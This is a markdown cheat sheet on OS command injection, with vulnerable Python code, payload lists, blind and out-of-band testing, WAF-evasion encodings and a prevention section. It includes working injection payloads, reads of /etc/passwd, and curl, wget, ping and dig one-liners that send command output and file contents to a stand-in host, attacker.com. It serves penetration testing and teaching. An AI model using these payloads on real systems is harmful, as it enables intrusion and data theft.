# 💣 Command Injection

Command Injection occurs when unsanitized user input is **passed directly to a system command**.

An attacker can inject arbitrary commands to be executed on the **OS level**, often leading to full system compromise.

## 🧠 1. What is Command Injection?

Many web applications use system commands via functions like:

- `os.system()` / `subprocess` (Python)
    
- `exec()` / `shell_exec()` (PHP)
    
- `Runtime.exec()` (Java)
    
- `child_process.exec()` (Node.js)
    

If user input is not properly sanitized or validated, an attacker can append shell operators to alter the command execution flow.

## 📥 2. Vulnerable Code Example & Mechanics

### Python Example

```
import os

def ping_host(host):
    # Unsanitized string concatenation passed to shell
    os.system("ping -c 1 " + host)
```

If the input provided is: `127.0.0.1; whoami`

The underlying system executes: `ping -c 1 127.0.0.1; whoami`

## ⚡ 3. Command Chaining Operators

The characters used to separate or chain commands depend on the operating system and shell environment.

### Linux / Unix Shells

- `Command1 ; Command2` : Executes `Command2` regardless of whether `Command1` succeeds or fails.
    
- `Command1 && Command2` : Executes `Command2` **only if** `Command1` succeeds (returns exit code 0).
    
- `Command1 || Command2` : Executes `Command2` **only if** `Command1` fails (returns non-zero exit code).
    
- `Command1 | Command2` : Pipes the standard output of `Command1` into the standard input of `Command2`.
    
- `Command1 & Command2` : Runs `Command1` in the background and executes `Command2` in the foreground.
    
- `\n` (Newline) : Acts as a line break to execute a new command.
    

### Windows (CMD / PowerShell)

- `Command1 & Command2` : Executes `Command1` followed by `Command2`.
    
- `Command1 && Command2` : Executes `Command2` **only if** `Command1` succeeds.
    
- `Command1 || Command2` : Executes `Command2` **only if** `Command1` fails.
    
- `Command1 | Command2` : Pipes output from `Command1` to `Command2`.
    

## 📍 4. Attack Surface & Discovery

### Common Parameter Names

- **Network / Host:** `ip`, `host`, `domain`, `url`, `target`
    
- **Execution:** `cmd`, `exec`, `run`, `command`, `action`
    
- **File / Storage:** `path`, `file`, `filename`, `dir`
    
- **Operations:** `convert`, `format`, `backup`, `restore`
    

### Vulnerable Application Features

- **Diagnostic Utilities:** Admin panels with network utilities (`ping`, `traceroute`, `nslookup`).
    
- **File Processing:** Image resizing/conversion (`ImageMagick`, `FFmpeg`), OCR modules.
    
- **Document / PDF Generation:** Web page rendering (`wkhtmltopdf`, headless browser wrappers).
    
- **Archive Operations:** Compression or extraction tools (`zip`, `tar`, `unrar`).
    
- **Integrations:** Webhooks or external CLI tools invoked by scripts.
    
- **Data Import/Export:** CSV transformers, database migration scripts.
    

### Discovery Techniques

- **Parameter Fuzzing:** Using tools like `ffuf` or `arjun` to find hidden parameters.
    
- **Error Analysis:** Verbose stack traces revealing binary names or paths.
    
- **Client-Side Code Analysis:** Inspecting JavaScript source files and API endpoints.
    

## 🧩 5. Context Fingerprinting

Before injecting payloads, determine how the input is integrated into the backend execution string:

1. **Direct Argument vs. String Literal:** Is the input enclosed in single/double quotes?
    
    - _Example Quote Breaking:_ `"; whoami; "` or `'; whoami; '`
        
2. **Operating System & Shell Type:** Identify whether the target runs `bash`, `sh`, `cmd.exe`, or `PowerShell`.
    
3. **Execution Mode:**
    
    - **In-band / Non-blind:** Output is directly returned in the HTTP response.
        
    - **Blind (Indirect):** Output is not returned, but execution status affects application state or response status/time.
        
    - **Out-of-Band (OOB):** Output is completely suppressed; interaction must be validated via external protocols.
        

## 🧪 6. Testing Methodologies

### 6.1 Non-Blind Testing

Injecting commands to verify direct response reflection:

```
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 || uname -a
127.0.0.1 | whoami
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
127.0.0.1%0aid  --> Newline
```

### 6.2 Blind — Time-Based Detection

Observing delay in response time to confirm execution:

```
127.0.0.1; sleep 5
127.0.0.1; sleep 5;
127.0.0.1 && ping -c 5 127.0.0.1
```

### 6.3 Blind — File System Manipulation

Checking for side effects on the local file system:

```
# Redirect output to a web-accessible or temporary path
ls > /tmp/output.txt
ls >> /tmp/output.txt  # Append mode
```

### 6.4 Blind — Out-of-Band (OOB) Data Exfiltration

When no direct output or timing channel is available, exfiltrate data via external interaction servers (e.g., HTTP, DNS).
use https://app.interactsh.com/ or https://webhook.site or burp for OOB.

#### HTTP Exfiltration (e.g., `curl` / `wget`)

```
# Basic outbound request
curl http://attacker.com/

# Exfiltrating data via URL parameter or path
curl http://attacker.com/?data=$(whoami)
curl http://attacker.com/$(whoami)

# Exfiltrating data via POST body
curl http://attacker.com/ -d "$(ls -la)"
echo `uptime` | curl http://attacker.com/ -d @-
cat app.js | base64 | curl http://attacker.com/ -d @-

# Using wget
wget http://attacker.com/?data="$(id)"
```

#### DNS Exfiltration (`ping` / `dig`)

DNS queries can carry exfiltrated data as subdomains. Since domain labels are limited to alphanumeric characters and hyphens, data is often hex-encoded before transmission.

```
# Hex-encoding command output and sending via DNS lookup
id | xxd -p | while read line; do ping $line.attacker.com -c 1; done
ls | xxd -p | while read line; do dig @127.0.0.1 $line.attacker.com; done
```

## 🛡️ 7. Filter Evasion & Encoding Bypass

When common operators or spaces are filtered by WAFs or input sanitizers:

* **Newline Injection** — Effective against regex using the `m` (multiline) flag, e.g. `preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/m', $ip)`. With `m`, `^`/`$` match the start/end of *each line*, not the whole string — so one valid-looking line satisfies the check while extra lines still get executed by the shell (since `\n` acts as a command separator, like `;`).
  * `127.0.0.1%0awhoami`
  * `127.0.0.1%0aid`
  * Variants: (CRLF Injection) `%0d%0a` or `%0a%0d`, `%0d` alone, `%0a` alone

* **URL Encoding / Percent-Encoding:** Ensure special characters are properly URL-encoded during HTTP requests.
  * Space ( ) → `%20` or `+`
  * Ampersand (`&`) → `%26`
  * Semicolon (`;`) → `%3b`
  * Pipe (`|`) → `%7c`
  * Newline → `%0a`
  * **Double encoding:** `%3b` → `%253b` — bypasses filters that check the raw string before a second decode happens server-side.

* **Space Alternatives:** Use environment variables like `$IFS` in Linux (Internal Field Separator) when spaces are restricted:
  * `cat$IFS/etc/passwd`
  * `127.0.0.1;cat$IFS/etc/passwd`
  * Also try tab (`%09`) or extra/duplicate spaces against loosely-written regex.

* **Quote / String Manipulation:** Concatenate variables or subshells to evade naive string matching.

* **Case Variation:** Mainly useful against **blacklists on command names** (not on metacharacters). Since the shell itself is case-sensitive, you can't just uppercase the command — instead encode/decode it inside a subshell:
  * `$(echo d2hvYW1p | base64 -d)` → decodes to `whoami` at execution time, bypassing a literal string match on "whoami".
  * Not applicable here (filter is on the IP, not on command names), but useful in blacklist-style challenges.

## ✅ 8. Confirmation & Classification Matrix

|Result Type|Description|Verification Criterion|
|---|---|---|
|**Direct (Non-blind)**|Command output returns directly in response body|Reflection of system info (e.g., `uid=0(root)`)|
|**Indirect (Blind)**|Boolean state changes or time delays|Response status (200 vs 500) or strict execution delay (+5s)|
|**Out-of-Band (OOB)**|Interaction logged on external listener|HTTP requests or DNS queries received on listener|

_Note: Always capture a baseline response (without payloads) to measure timing and length variances accurately._

## ⚒️ 9. Analysis Tools & Payload Repositories

- **Burp Suite:** Manual testing, payload encoding, and Burp Collaborator for OOB detection.
    
- **Commix:** Automated tool for detecting and exploiting command injection vulnerabilities.
    
- **ffuf / Arjun:** Parameter discovery and fuzzer utilities.
    
- **OOB Listeners:** `interactsh`, `webhook.site`, or custom `tcpdump` / HTTP listeners.
    
- **Payload Resources:** [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection "null")
    

## 🛡️ 10. Prevention & Remediation

- ❌ **Avoid Shell Execution:** Never pass unvalidated user input directly to system shells or commands.
    
- ✅ **Use Parameterized APIs:** Utilize safe functions that do not invoke a shell context (e.g., Python's `subprocess.run(["ping", "-c", "1", host], shell=False)`).
    
- ✅ **Input Validation & Allowlists:** Validate inputs strictly against expected data types (e.g., IP address regex, numeric IDs).
    
- ✅ **Contextual Escaping:** If shell execution is unavoidable, escape all shell metacharacters strictly using language-specific functions.
    
- ✅ **Principle of Least Privilege:** Run the application process under a low-privileged OS account to minimize potential impact.
